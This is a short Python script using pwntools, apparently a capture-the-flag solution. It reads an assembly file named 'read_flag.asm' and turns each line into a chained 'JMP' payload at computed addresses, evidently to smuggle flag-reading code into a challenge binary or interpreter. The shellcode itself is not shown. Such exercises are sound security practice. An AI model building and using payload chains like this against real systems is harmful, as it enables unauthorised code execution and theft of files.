from pwn import *

context(arch='amd64')

jmp_addr = 0x400000

def generate_payload(s):
    global jmp_addr
    jmp_addr += len("JMP 0x") + 8 + len('\nJMP ')
    print("JMP 0x{:08x}\nJMP {}".format(jmp_addr, s))
    jmp_addr += len(s) + 1


code = ''
with open('read_flag.asm', mode='r') as code_file:
    code = code_file.read()

for section in code.split('\n'):
    generate_payload(section)
